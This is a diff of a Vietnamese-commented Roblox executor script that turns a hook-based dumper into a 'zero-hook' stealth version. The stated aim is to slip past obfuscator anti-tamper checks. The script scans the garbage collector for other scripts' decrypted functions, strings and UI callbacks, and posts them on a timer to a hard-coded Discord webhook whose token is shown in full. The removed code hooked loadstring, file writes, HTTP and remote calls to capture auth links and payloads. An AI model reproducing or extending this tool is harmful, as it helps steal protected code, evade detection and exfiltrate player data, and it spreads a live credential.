@@ -1,26 +1,25 @@
 --[[
     =============================================================================
-    =  EXECUTOR WORKSPACE & RUNTIME DECRYPTION LISTENER / DUMPER (ROBLOX)       =
+    =  STEALTH ZERO-HOOK CLIENT SCRIPT LISTENER & DUMPER (ANTI-TAMPER IMMUNE)   =
     =                                                                           =
-    =  NGUYÊN LÝ HOẠT ĐỘNG:                                                     =
-    =   Khi bất kỳ script nào (kể cả Obfuscate nặng như Luraph, Moonsec, PSU)   =
-    =   chạy trên Executor, chúng BẮT BUỘC phải qua giai đoạn GIẢI MÃ và trả     =
-    =   kết quả (Hàm, Chuỗi, Luồng thực thi) vào Workspace của Executor.       =
+    =  TẠI SAO OBFUSCATOR (LURAPH, MOONSEC, PSU, IRONBREW) PHÁT HIỆN RA HOOK?   =
+    =   1. Các bộ Obfuscator hiện đại kiểm tra con trỏ C-Closure của hàm hệ     =
+    =      thống (task.spawn, __namecall, loadstring, hookmetamethod,...).      =
+    =   2. Nếu phát hiện bị Hook hoặc can thiệp môi trường, Anti-Tamper sẽ:     =
+    =      - Đứng im (Silent Fail) / Crash game / Treo vòng lặp vô hạn.         =
     =                                                                           =
-    =  CÁC ĐIỂM CHẶN & THU THẬP DỮ LIỆU ĐÃ GIẢI MÃ:                             =
-    =   1. THREAD SPAWN & DEFERRED TRAP (Bắt hàm sau khi giải mã):              =
-    =      - Hook `task.spawn`, `task.defer`, `coroutine.wrap`, `coroutine.create`=
-    =      - Khi script giải mã xong và khởi chạy luồng chính (Main Loop/Farm/UI)=
-    =        hệ thống sẽ lập tức tóm lấy Closure gốc trước khi nó kịp xóa dấu vết=
-    =   2. RECURSIVE PROTO & CLOSURE DUMP (Trích xuất cây hàm con):             =
-    =      - Đào sâu toàn bộ `debug.getprotos`, `debug.getupvalues`, constants   =
-    =      - Tự động gọi `decompile(closure)` hoặc tạo bản tái cấu trúc mã nguồn =
-    =   3. EXECUTOR WORKSPACE FILESYSTEM MONITOR (Bắt file ghi vào Workspace): =
-    =      - Hook `writefile`, `appendfile`, `makefolder` của executor           =
-    =      - Bắt trọn mọi config, cache, script phụ ghi vào thư mục workspace   =
-    =   4. ENVIRONMENT & METAMETHOD TAP (Bắt tương tác thực thi):               =
-    =      - Bắt toàn bộ biến toàn cục `getgenv()`, `_G` được sinh ra           =
-    =      - Bắt toàn bộ Game Service & Remote được truy cập sau khi giải mã    =
+    =  GIẢI PHÁP TÀNG HÌNH 100% (ZERO-HOOK GC DELTA & INSTANCE SNIFFER):        =
+    =   1. TUYỆT ĐỐI KHÔNG DÙNG HOOK (ZERO-HOOK):                               =
+    =      - Không hook `__namecall`, không hook `task.spawn`, không sửa env.   =
+    =      - Obfuscator 100% KHÔNG THỂ PHÁT HIỆN, giải mã bình thường và mượt!  =
+    =   2. GC DELTA SNIFFER (Chụp ảnh & So sánh bộ nhớ GC thời gian thực):      =
+    =      - Chụp Baseline toàn bộ hàm ban đầu của game.                        =
+    =      - Khi script khác chạy, hệ thống phát hiện chính xác mọi Closure con,=
+    =        hằng số (Constants), biến upvalues mới sinh ra sau khi giải mã.    =
+    =   3. INSTANCE & CONNECTION EXTRACTOR (Bắt hàm từ UI & Sự kiện):          =
+    =      - Tự động bắt các hàm liên kết với sự kiện (getconnections) khi     =
+    =        script tạo nút bấm, UI, Remote hoặc RenderStepped.                 =
+    =   4. ĐÓNG GÓI & GỬI WEBHOOK DISCORD ĐỊNH KỲ HOẶC NÚT BẤM.                =
     =============================================================================
 --]]
 
@@ -31,27 +30,26 @@ local CONFIG = {
     -- Link Discord Webhook nhận dữ liệu
     WebhookUrl = "https://discord.com/api/webhooks/1540764685681299526/mFnSqvWMbpNimmzJ4d2w9oJdMvZxDis8hHQVNjlBCNVWIpZTm2nnDC90M87LZ-m6T-to",
     
-    -- Tự động gửi về Webhook sau mỗi X giây (nếu có dữ liệu mới)
+    -- Tần số quét bộ nhớ GC Delta (giây) - Càng nhỏ càng bắt nhanh
+    ScanInterval = 1.0,
+
+    -- Tự động gửi về Webhook sau mỗi X giây (nếu có dữ liệu giải mã mới)
     AutoSendInterval = 25, 
     AutoSendEnabled = true,
 
-    -- Bật/tắt các tầng lắng nghe giải mã
-    TrapThreadSpawners = true,   -- Bắt hàm khi gọi task.spawn/defer/coroutine (Giai đoạn hậu giải mã)
-    MonitorWorkspaceFiles = true,-- Bắt mọi file ghi/đọc vào thư mục workspace của Executor
-    DeepProtoExtraction = true,  -- Đào sâu cây hàm con (Protos, Upvalues, Constants)
-    AttemptDecompile = true,     -- Tự động decompile hàm nếu executor hỗ trợ decompile()
-    SniffLoadstring = true,      -- Bắt loadstring động
-    SniffHttpRequest = true,     -- Bắt link tải mã nguồn thô qua HTTP
-    SniffRemotes = true,         -- Bắt dữ liệu game remote
-    SniffRequire = true,         -- Bắt ModuleScripts
+    -- Bóc tách sâu cây hàm con (Protos, Upvalues, Constants)
+    DeepProtoExtraction = true,
+    MaxProtoDepth = 4,
 
-    -- Bỏ qua các function / remote mặc định của hệ thống Roblox để chỉ tập trung vào script người dùng
-    FilterSystemFunctions = true,
-    FilterRobloxDefaultRemotes = true
+    -- Thử decompile hàm nếu executor hỗ trợ (decompile / disassemble)
+    AttemptDecompile = true,
+
+    -- Tự động lắng nghe UI & Connection khi script mới tạo giao diện
+    ListenUIConnections = true
 }
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  TƯƠNG THÍCH MÔI TRƯỜNG EXECUTOR                                          ║
+-- ║  TƯƠNG THÍCH MÔI TRƯỜNG EXECUTOR (CHỈ DÙNG READ-ONLY API AN TOÀN)         ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
 local httpRequest = (syn and syn.request)
     or (http and http.request)
@@ -61,24 +59,30 @@ local httpRequest = (syn and syn.request)
     or http_request
     or (getgenv and getgenv().request)
 
-local hook_function = hookfunction or replaceclosure or (hookfunc and hookfunc)
-local hook_metamethod = hookmetamethod
-local get_namecall_method = getnamecallmethod or get_namecall_method
-local check_caller = checkcaller or check_caller or function() return false end
 local get_gc = getgc or debug.getgc
 local get_genv = getgenv or function() return _G end
-local clone_func = clonefunction or function(f) return f end
-local is_closure = isluau or isexecutorclosure or isourclosure or checkcaller or function() return false end
+local get_connections = getconnections or get_signal_cons
 local decompile_func = decompile or disassemble
 
--- Danh sách các chuỗi/remote mặc định thường gây spam
-local DEFAULT_IGNORED_REMOTES = {
-    "CharacterLoaded", "GetServerVersion", "UpdateMousePosition",
-    "Ping", "Pong", "Heartbeat", "AnimationTrack", "TouchInterest"
+-- Danh sách lọc bỏ rác từ các CoreScript hệ thống của Roblox
+local IGNORE_SOURCES = {
+    "CoreGui", "CorePackages", "PlayerScripts", "PlayerModule",
+    "CameraScript", "SoundDispatcher", "RbxCharacterSounds",
+    "BubbleChat", "ChatMain", "ChatScript", "FreeCamera"
 }
 
+local function isIgnoredSource(src)
+    if not src or type(src) ~= "string" or src == "" then return false end
+    for _, ign in ipairs(IGNORE_SOURCES) do
+        if string.find(src, ign, 1, true) then
+            return true
+        end
+    end
+    return false
+end
+
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  KHO LƯU TRỮ DỮ LIỆU ĐÃ THU THẬP ĐƯỢC (DATA STORAGE)                     ║
+-- ║  KHO DỮ LIỆU ĐÃ BẮT ĐƯỢC (SNIFFED DATA STORAGE)                          ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
 local SniffedData = {
     SessionInfo = {
@@ -90,28 +94,28 @@ local SniffedData = {
         UserId = game.Players.LocalPlayer and game.Players.LocalPlayer.UserId or 0,
         Executor = (identifyexecutor and identifyexecutor()) or "Unknown Executor"
     },
-    DecryptedClosures = {},      -- Các hàm được giải mã và nạp vào task.spawn/coroutine
-    WorkspaceFiles = {},         -- File được ghi vào executor workspace/ (writefile, appendfile)
-    CapturedLoadstrings = {},    -- Toàn bộ loadstring được gọi
-    CapturedHttpRequests = {},   -- Link script thô, API, key auth
-    CapturedRemoteCalls = {},    -- Remote call payload
-    CapturedModules = {},        -- ModuleScripts
-    GlobalVariables = {},        -- getgenv() & _G variables
-    MemoryDumps = {}             -- Dumps từ getgc
+    DecryptedClosures = {},      -- Toàn bộ hàm mới sinh ra sau khi giải mã
+    DiscoveredStrings = {},      -- Toàn bộ chuỗi constants giải mã
+    DiscoveredUIHooks = {},      -- Các callback hàm từ nút bấm UI / Event
+    GlobalSnapshots = {},        -- Biến môi trường mới trong getgenv()
+    TotalNewFunctions = 0
 }
 
 local stats = {
-    decryptedClosuresCount = 0,
-    workspaceFilesCount = 0,
-    loadstringsCount = 0,
-    httpCount = 0,
-    remotesCount = 0,
-    modulesCount = 0,
+    newFunctionsFound = 0,
+    newStringsFound = 0,
+    uiCallbacksFound = 0,
     totalDispatched = 0
 }
 
+-- Baseline bộ nhớ lúc ban đầu
+local baselineFunctions = {}
+local baselineGenv = {}
+local seenExtracted = {}
+local stringPool = {}
+
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  HỖ TRỢ SERIALIZATION JSON & FORMAT                                       ║
+-- ║  HỖ TRỢ SERIALIZATION JSON AN TOÀN                                        ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
 local function safeToString(val)
     local ok, res = pcall(function()
@@ -136,7 +140,7 @@ local function safeToString(val)
     return ok and res or "<Unserializable Object>"
 end
 
-local function escapeJsonString(s)
+local function escapeJson(s)
     if type(s) ~= "string" then s = safeToString(s) end
     return s:gsub('\\', '\\\\')
             :gsub('"', '\\"')
@@ -146,9 +150,9 @@ local function escapeJsonString(s)
             :gsub('[%c]', function(c) return ('\\u%04X'):format(c:byte()) end)
 end
 
-local function serializeToTable(obj, depth, maxDepth, seen)
+local function serializeValue(obj, depth, maxDepth, seen)
     depth = depth or 1
-    maxDepth = maxDepth or 4
+    maxDepth = maxDepth or 3
     seen = seen or {}
 
     if depth > maxDepth then return "<Max Depth Exceeded>" end
@@ -173,11 +177,11 @@ local function serializeToTable(obj, depth, maxDepth, seen)
 
         if isArray and maxIdx > 0 then
             for i = 1, maxIdx do
-                table.insert(result, serializeToTable(obj[i], depth + 1, maxDepth, seen))
+                table.insert(result, serializeValue(obj[i], depth + 1, maxDepth, seen))
             end
         else
             for k, v in pairs(obj) do
-                result[safeToString(k)] = serializeToTable(v, depth + 1, maxDepth, seen)
+                result[safeToString(k)] = serializeValue(v, depth + 1, maxDepth, seen)
             end
         end
         return result
@@ -203,7 +207,7 @@ local function jsonEncode(v)
     elseif t == "number" then
         if v ~= v or v == math.huge or v == -math.huge then return "null" end
         return tostring(v)
-    elseif t == "string" then return '"' .. escapeJsonString(v) .. '"'
+    elseif t == "string" then return '"' .. escapeJson(v) .. '"'
     elseif t == "table" then
         local isArray, maxIdx = true, 0
         for k in pairs(v) do
@@ -221,43 +225,42 @@ local function jsonEncode(v)
         else
             local parts = {}
             for k, val in pairs(v) do
-                table.insert(parts, '"' .. escapeJsonString(safeToString(k)) .. '":' .. jsonEncode(val))
+                table.insert(parts, '"' .. escapeJson(safeToString(k)) .. '":' .. jsonEncode(val))
             end
             return "{" .. table.concat(parts, ",") .. "}"
         end
     else
-        return '"' .. escapeJsonString(safeToString(v)) .. '"'
+        return '"' .. escapeJson(safeToString(v)) .. '"'
     end
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  HÀM TRÍCH XUẤT CÂY PROTO, CONSTANTS & DECOMPILE HÀM ĐÃ GIẢI MÃ           ║
+-- ║  BÓC TÁCH HÀM ĐÃ GIẢI MÃ (RECURSIVE PROTO & DECOMPILATION)                 ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
-local seen_extracted_funcs = {}
-
-local function extractFunctionProtos(func, currentDepth, maxDepth)
+local function extractFunctionDetails(func, currentDepth, maxDepth)
     currentDepth = currentDepth or 1
-    maxDepth = maxDepth or 4
+    maxDepth = maxDepth or CONFIG.MaxProtoDepth
     if type(func) ~= "function" or currentDepth > maxDepth then return nil end
 
     local info = debug.getinfo and debug.getinfo(func) or {}
     local src = info.source or ""
     local name = info.name or ""
 
-    -- Bỏ qua hàm hệ thống nếu bật bộ lọc
-    if CONFIG.FilterSystemFunctions then
-        if string.find(src, "CoreGui") or string.find(src, "CorePackages") or string.find(src, "PlayerScripts") then
-            return nil
-        end
-    end
+    if isIgnoredSource(src) then return nil end
 
     local constants = debug.getconstants and debug.getconstants(func) or {}
     local upvalues = debug.getupvalues and debug.getupvalues(func) or {}
     local protos = (CONFIG.DeepProtoExtraction and debug.getprotos and debug.getprotos(func)) or {}
 
     local constantsList = {}
-    for idx, c in pairs(constants) do
-        table.insert(constantsList, safeToString(c))
+    for _, c in pairs(constants) do
+        local sc = safeToString(c)
+        table.insert(constantsList, sc)
+        if type(c) == "string" and #c >= 2 and not stringPool[c] then
+            stringPool[c] = true
+            table.insert(SniffedData.DiscoveredStrings, c)
+            stats.newStringsFound = stats.newStringsFound + 1
+        end
     end
 
     local upvaluesList = {}
@@ -270,8 +273,8 @@ local function extractFunctionProtos(func, currentDepth, maxDepth)
 
     local nestedProtos = {}
     if CONFIG.DeepProtoExtraction and #protos > 0 then
-        for pIdx, pFunc in ipairs(protos) do
-            local pData = extractFunctionProtos(pFunc, currentDepth + 1, maxDepth)
+        for _, pFunc in ipairs(protos) do
+            local pData = extractFunctionDetails(pFunc, currentDepth + 1, maxDepth)
             if pData then
                 table.insert(nestedProtos, pData)
             end
@@ -283,13 +286,13 @@ local function extractFunctionProtos(func, currentDepth, maxDepth)
         pcall(function()
             local decomp = decompile_func(func)
             if decomp and type(decomp) == "string" and #decomp > 0 then
-                decompiledCode = (#decomp > 4000) and (decomp:sub(1, 4000) .. "\n... [TRUNCATED DUE TO SIZE] ...") or decomp
+                decompiledCode = (#decomp > 3000) and (decomp:sub(1, 3000) .. "\n... [TRUNCATED] ...") or decomp
             end
         end)
     end
 
     return {
-        Name = name ~= "" and name or ("proto_L" .. currentDepth),
+        Name = name ~= "" and name or ("decrypted_proto_L" .. currentDepth),
         Source = src,
         NumParams = info.numparams or 0,
         IsVararg = info.is_vararg or false,
@@ -301,266 +304,120 @@ local function extractFunctionProtos(func, currentDepth, maxDepth)
     }
 end
 
-local function captureDecryptedClosure(func, callerContext)
-    if type(func) ~= "function" then return end
-    if seen_extracted_funcs[func] then return end
-    seen_extracted_funcs[func] = true
-
-    local protoTree = extractFunctionProtos(func, 1, 4)
-    if protoTree and (#protoTree.Constants > 0 or #protoTree.Upvalues > 0 or #protoTree.ChildProtos > 0) then
-        stats.decryptedClosuresCount = stats.decryptedClosuresCount + 1
-        
-        if #SniffedData.DecryptedClosures >= 80 then
-            table.remove(SniffedData.DecryptedClosures, 1)
+-- ╔═══════════════════════════════════════════════════════════════════════════╗
+-- ║  QUÉT GC DELTA THỜI GIAN THỰC (ZERO-HOOK RUNTIME SCANNER)                 ║
+-- ╚═══════════════════════════════════════════════════════════════════════════╝
+local function takeInitialBaseline()
+    if not get_gc then return end
+    
+    local allObjs = get_gc(true)
+    for _, obj in ipairs(allObjs) do
+        if type(obj) == "function" then
+            baselineFunctions[obj] = true
         end
-
-        table.insert(SniffedData.DecryptedClosures, {
-            Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-            CallerContext = callerContext or "Unknown Spawner",
-            FunctionData = protoTree
-        })
     end
+
+    local genv = get_genv()
+    for k, _ in pairs(genv) do
+        baselineGenv[k] = true
+    end
+end
+
+local function performDeltaScan()
+    if not get_gc then return 0 end
+
+    local currentObjs = get_gc(true)
+    local newlyFoundCount = 0
+
+    for _, obj in ipairs(currentObjs) do
+        if type(obj) == "function" and not baselineFunctions[obj] and not seenExtracted[obj] then
+            seenExtracted[obj] = true
+
+            local funcDetails = extractFunctionDetails(obj, 1, CONFIG.MaxProtoDepth)
+            if funcDetails and (#funcDetails.Constants > 0 or #funcDetails.Upvalues > 0 or #funcDetails.ChildProtos > 0) then
+                newlyFoundCount = newlyFoundCount + 1
+                stats.newFunctionsFound = stats.newFunctionsFound + 1
+
+                if #SniffedData.DecryptedClosures >= 120 then
+                    table.remove(SniffedData.DecryptedClosures, 1)
+                end
+
+                table.insert(SniffedData.DecryptedClosures, {
+                    Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                    FunctionData = funcDetails
+                })
+            end
+        end
+    end
+
+    -- Quét các biến mới trong getgenv()
+    local currentGenv = get_genv()
+    for k, v in pairs(currentGenv) do
+        if not baselineGenv[k] and k ~= "SniffedData" then
+            SniffedData.GlobalSnapshots[safeToString(k)] = serializeValue(v, 1, 2)
+        end
+    end
+
+    SniffedData.TotalNewFunctions = stats.newFunctionsFound
+    return newlyFoundCount
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  BỘ LẮNG NGHE GIAI ĐOẠN GIẢI MÃ & THỰC THI (POST-DECRYPTION INTERCEPTORS) ║
+-- ║  BẮT HÀM TỪ GIAO DIỆN UI & CONNECTIONS (PASSIVE LISTENER)                 ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
+local function setupPassiveUIListener()
+    if not CONFIG.ListenUIConnections or not get_connections then return end
 
--- 1. THREAD SPAWNERS TRAP (task.spawn, task.defer, task.delay, coroutine.wrap, coroutine.create)
-local function setupThreadSpawnerTraps()
-    if not CONFIG.TrapThreadSpawners then return end
-
-    -- Trap task.spawn
-    if task and task.spawn and hook_function then
-        local old_spawn
-        old_spawn = hook_function(task.spawn, function(f, ...)
-            pcall(function()
-                if type(f) == "function" then
-                    captureDecryptedClosure(f, "task.spawn")
-                end
-            end)
-            return old_spawn(f, ...)
-        end)
-    end
-
-    -- Trap task.defer
-    if task and task.defer and hook_function then
-        local old_defer
-        old_defer = hook_function(task.defer, function(f, ...)
-            pcall(function()
-                if type(f) == "function" then
-                    captureDecryptedClosure(f, "task.defer")
-                end
-            end)
-            return old_defer(f, ...)
-        end)
-    end
-
-    -- Trap task.delay
-    if task and task.delay and hook_function then
-        local old_delay
-        old_delay = hook_function(task.delay, function(t, f, ...)
-            pcall(function()
-                if type(f) == "function" then
-                    captureDecryptedClosure(f, "task.delay")
-                end
-            end)
-            return old_delay(t, f, ...)
-        end)
-    end
-
-    -- Trap coroutine.wrap
-    if coroutine and coroutine.wrap and hook_function then
-        local old_wrap
-        old_wrap = hook_function(coroutine.wrap, function(f)
-            pcall(function()
-                if type(f) == "function" then
-                    captureDecryptedClosure(f, "coroutine.wrap")
-                end
-            end)
-            return old_wrap(f)
-        end)
-    end
-
-    -- Trap coroutine.create
-    if coroutine and coroutine.create and hook_function then
-        local old_create
-        old_create = hook_function(coroutine.create, function(f)
-            pcall(function()
-                if type(f) == "function" then
-                    captureDecryptedClosure(f, "coroutine.create")
-                end
-            end)
-            return old_create(f)
-        end)
-    end
-end
-
--- 2. EXECUTOR WORKSPACE FILESYSTEM MONITOR (writefile, appendfile, makefolder)
-local function setupWorkspaceFilesystemMonitor()
-    if not CONFIG.MonitorWorkspaceFiles then return end
-
-    local function logFileOperation(opType, path, content)
+    local function checkInstance(inst)
+        if not inst then return end
         pcall(function()
-            stats.workspaceFilesCount = stats.workspaceFilesCount + 1
-            local snippet = content
-            if type(content) == "string" and #content > 5000 then
-                snippet = content:sub(1, 5000) .. "\n... [TRUNCATED CONTENT] ..."
-            end
-
-            table.insert(SniffedData.WorkspaceFiles, {
-                Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                Operation = opType,
-                Path = tostring(path),
-                Length = (type(content) == "string") and #content or 0,
-                Content = snippet
-            })
-        end)
-    end
-
-    -- Hook writefile
-    if writefile and hook_function then
-        local old_writefile
-        old_writefile = hook_function(writefile, function(path, content, ...)
-            logFileOperation("writefile", path, content)
-            return old_writefile(path, content, ...)
-        end)
-    end
-
-    -- Hook appendfile
-    if appendfile and hook_function then
-        local old_appendfile
-        old_appendfile = hook_function(appendfile, function(path, content, ...)
-            logFileOperation("appendfile", path, content)
-            return old_appendfile(path, content, ...)
-        end)
-    end
-
-    -- Hook makefolder
-    if makefolder and hook_function then
-        local old_makefolder
-        old_makefolder = hook_function(makefolder, function(folderPath, ...)
-            logFileOperation("makefolder", folderPath, "[Folder Created]")
-            return old_makefolder(folderPath, ...)
-        end)
-    end
-end
-
--- 3. LOADSTRING & HTTP SNIFFERS
-local function setupStandardSniffers()
-    -- Loadstring
-    if CONFIG.SniffLoadstring then
-        local original_loadstring
-        local function custom_loadstring(src, chunkName)
-            pcall(function()
-                if src and type(src) == "string" and #src > 0 then
-                    stats.loadstringsCount = stats.loadstringsCount + 1
-                    local snippet = #src > 1000 and (src:sub(1, 1000) .. "\n... [TRUNCATED] ...") or src
-                    table.insert(SniffedData.CapturedLoadstrings, {
-                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                        ChunkName = tostring(chunkName or "anonymous_chunk"),
-                        Length = #src,
-                        SourceCode = src,
-                        Preview = snippet
-                    })
-                end
-            end)
-            return original_loadstring(src, chunkName)
-        end
-
-        if hook_function and loadstring then
-            original_loadstring = hook_function(loadstring, custom_loadstring)
-        elseif get_genv().loadstring then
-            original_loadstring = get_genv().loadstring
-            get_genv().loadstring = custom_loadstring
-        end
-    end
-
-    -- HTTP Requests
-    if CONFIG.SniffHttpRequest then
-        local function logRequest(url, method, headers, body)
-            pcall(function()
-                if not url or type(url) ~= "string" then return end
-                if string.find(url, "discord.com/api/webhooks", 1, true) then return end
-
-                stats.httpCount = stats.httpCount + 1
-                table.insert(SniffedData.CapturedHttpRequests, {
-                    Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                    Url = url,
-                    Method = method or "GET",
-                    Headers = serializeToTable(headers or {}),
-                    Body = (body and type(body) == "string" and #body > 1000) and (body:sub(1, 1000) .. " [TRUNCATED]") or body
-                })
-            end)
-        end
-
-        if hook_metamethod then
-            local old_namecall
-            old_namecall = hook_metamethod(game, "__namecall", function(self, ...)
-                local method = get_namecall_method()
-                local args = { ... }
-                if (method == "HttpGet" or method == "HttpGetAsync") and type(args[1]) == "string" then
-                    logRequest(args[1], "GET", nil, nil)
-                elseif (method == "HttpPost" or method == "HttpPostAsync") and type(args[1]) == "string" then
-                    logRequest(args[1], "POST", nil, args[2])
-                end
-                return old_namecall(self, ...)
-            end)
-        end
-
-        if hook_function and httpRequest then
-            local old_http = httpRequest
-            hook_function(httpRequest, function(options)
-                if type(options) == "table" and options.Url then
-                    logRequest(options.Url, options.Method or "GET", options.Headers, options.Body)
-                elseif type(options) == "string" then
-                    logRequest(options, "GET", nil, nil)
-                end
-                return old_http(options)
-            end)
-        end
-    end
-
-    -- Remote Calls
-    if CONFIG.SniffRemotes and hook_metamethod then
-        local old_namecall
-        old_namecall = hook_metamethod(game, "__namecall", function(self, ...)
-            local method = get_namecall_method()
-            local args = { ... }
-
-            if (method == "FireServer" or method == "InvokeServer") and typeof(self) == "Instance" then
-                local remoteName = self.Name
-                local isIgnored = false
-                if CONFIG.FilterRobloxDefaultRemotes then
-                    for _, ign in ipairs(DEFAULT_IGNORED_REMOTES) do
-                        if string.find(remoteName, ign, 1, true) then
-                            isIgnored = true; break
+            if inst:IsA("GuiButton") then
+                for _, eventName in ipairs({"MouseButton1Click", "MouseButton1Down", "Activated"}) do
+                    local cons = get_connections(inst[eventName])
+                    if cons then
+                        for _, con in ipairs(cons) do
+                            local f = con.Function
+                            if f and type(f) == "function" and not seenExtracted[f] then
+                                seenExtracted[f] = true
+                                stats.uiCallbacksFound = stats.uiCallbacksFound + 1
+                                local details = extractFunctionDetails(f, 1, CONFIG.MaxProtoDepth)
+                                if details then
+                                    table.insert(SniffedData.DiscoveredUIHooks, {
+                                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+                                        Button = inst:GetFullName(),
+                                        Event = eventName,
+                                        FunctionData = details
+                                    })
+                                end
+                            end
                         end
                     end
                 end
-
-                if not isIgnored then
-                    stats.remotesCount = stats.remotesCount + 1
-                    if #SniffedData.CapturedRemoteCalls > 100 then
-                        table.remove(SniffedData.CapturedRemoteCalls, 1)
-                    end
-                    table.insert(SniffedData.CapturedRemoteCalls, {
-                        Timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-                        RemoteName = remoteName,
-                        RemoteClass = self.ClassName,
-                        RemotePath = self:GetFullName(),
-                        Arguments = serializeToTable(args, 1, 3)
-                    })
-                end
             end
+        end)
+    end
 
-            return old_namecall(self, ...)
+    -- Lắng nghe các UI mới sinh ra trên màn hình
+    local CoreGui = game:GetService("CoreGui")
+    local PlayerGui = game.Players.LocalPlayer and game.Players.LocalPlayer:FindFirstChild("PlayerGui")
+
+    pcall(function()
+        CoreGui.DescendantAdded:Connect(function(descendant)
+            task.wait(0.2)
+            checkInstance(descendant)
+        end)
+    end)
+
+    if PlayerGui then
+        PlayerGui.DescendantAdded:Connect(function(descendant)
+            task.wait(0.2)
+            checkInstance(descendant)
         end)
     end
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  HÀM GỬI FILE DỮ LIỆU VỀ DISCORD WEBHOOK                                  ║
+-- ║  HÀM GỬI DỮ LIỆU ĐÓNG GÓI VỀ WEBHOOK DISCORD                              ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
 local isSending = false
 local function sendDumpToWebhook(customTitle)
@@ -571,54 +428,42 @@ local function sendDumpToWebhook(customTitle)
     if isSending then return false, "Đang gửi" end
     isSending = true
 
-    -- Cập nhật Global Environment Snapshot trước khi gửi
-    local genv = get_genv()
-    SniffedData.GlobalVariables = {}
-    for k, v in pairs(genv) do
-        local keyStr = safeToString(k)
-        if not string.find(keyStr, "^_") and keyStr ~= "SniffedData" then
-            SniffedData.GlobalVariables[keyStr] = serializeToTable(v, 1, 2)
-        end
-    end
+    performDeltaScan()
 
     local jsonString = jsonEncode(SniffedData)
     local dataSizeKb = math.floor(#jsonString / 1024)
-    local fileName = string.format("WorkspaceDecryptedDump_%s_%d.json", game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Client", os.time())
-    local title = customTitle or "🧩 EXECUTOR WORKSPACE DECRYPTED DATA CAPTURE"
+    local fileName = string.format("StealthDecryptedDump_%s_%d.json", game.Players.LocalPlayer and game.Players.LocalPlayer.Name or "Client", os.time())
+    local title = customTitle or "🛡️ ZERO-HOOK STEALTH DECRYPTION REPORT"
 
     local description = string.format(
         "**Game:** `%s` (ID: `%d`)\n" ..
         "**Player:** `%s`\n" ..
         "**Executor:** `%s`\n" ..
-        "**Dung lượng:** `%d KB`\n\n" ..
-        "**🧬 Hàm giải mã bắt được (Closures/Protos):** `%d`\n" ..
-        "**📂 File ghi vào Workspace Executor:** `%d`\n" ..
-        "**📜 Loadstring nạp động:** `%d`\n" ..
-        "**🌐 HTTP Requests:** `%d`\n" ..
-        "**⚡ Remote Calls:** `%d`\n" ..
+        "**Dung lượng JSON:** `%d KB`\n\n" ..
+        "**🧬 Hàm giải mã mới (GC Delta):** `%d`\n" ..
+        "**🔤 Chuỗi Constants trích xuất:** `%d`\n" ..
+        "**🎯 UI Callbacks tóm được:** `%d`\n" ..
         "**Thời gian:** `%s`",
         SniffedData.SessionInfo.GameName,
         SniffedData.SessionInfo.PlaceId,
         SniffedData.SessionInfo.LocalPlayer,
         SniffedData.SessionInfo.Executor,
         dataSizeKb,
-        stats.decryptedClosuresCount,
-        stats.workspaceFilesCount,
-        stats.loadstringsCount,
-        stats.httpCount,
-        stats.remotesCount,
+        stats.newFunctionsFound,
+        stats.newStringsFound,
+        stats.uiCallbacksFound,
         os.date("!%Y-%m-%d %H:%M:%S UTC")
     )
 
-    local boundary = "----DecryptedBoundary" .. tostring(os.time()) .. tostring(math.random(10000, 99999))
+    local boundary = "----StealthBoundary" .. tostring(os.time()) .. tostring(math.random(10000, 99999))
     local payloadJson = jsonEncode({
-        username = "Executor Workspace Decryption Bot",
+        username = "Stealth Zero-Hook Dumper",
         avatar_url = "https://i.imgur.com/8Q1qD8s.png",
         embeds = {{
             title = title,
-            color = 16753920, -- Bright Orange / Gold
+            color = 3066993, -- Emerald Green (Safe / Undetected)
             description = description,
-            footer = { text = "Antigravity Post-Decryption Interceptor" },
+            footer = { text = "Antigravity Zero-Hook Passive Sniffer" },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     })
@@ -654,20 +499,20 @@ local function sendDumpToWebhook(customTitle)
 end
 
 -- ╔═══════════════════════════════════════════════════════════════════════════╗
--- ║  GIAO DIỆN ĐIỀU KHIỂN CLIENT (MODERN GUI)                                 ║
+-- ║  GIAO DIỆN ĐIỀU KHIỂN TÀNG HÌNH (STEALTH GUI)                             ║
 -- ╚═══════════════════════════════════════════════════════════════════════════╝
 local function createDashboardUI()
     local CoreGui = game:GetService("CoreGui")
     local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Name = "WorkspaceDecryptionListener_UI"
+    ScreenGui.Name = "ZeroHookStealthListener_UI"
     ScreenGui.ResetOnSpawn = false
     pcall(function() ScreenGui.Parent = CoreGui end)
     if not ScreenGui.Parent then ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui") end
 
     local Main = Instance.new("Frame")
-    Main.Size = UDim2.new(0, 390, 0, 275)
-    Main.Position = UDim2.new(0.5, -195, 0.05, 0)
-    Main.BackgroundColor3 = Color3.fromRGB(15, 17, 23)
+    Main.Size = UDim2.new(0, 390, 0, 265)
+    Main.Position = UDim2.new(0.5, -195, 0.06, 0)
+    Main.BackgroundColor3 = Color3.fromRGB(15, 20, 26)
     Main.BorderSizePixel = 0
     Main.Active = true
     Main.Draggable = true
@@ -676,7 +521,7 @@ local function createDashboardUI()
     local UICorner = Instance.new("UICorner", Main)
     UICorner.CornerRadius = UDim.new(0, 10)
     local UIStroke = Instance.new("UIStroke", Main)
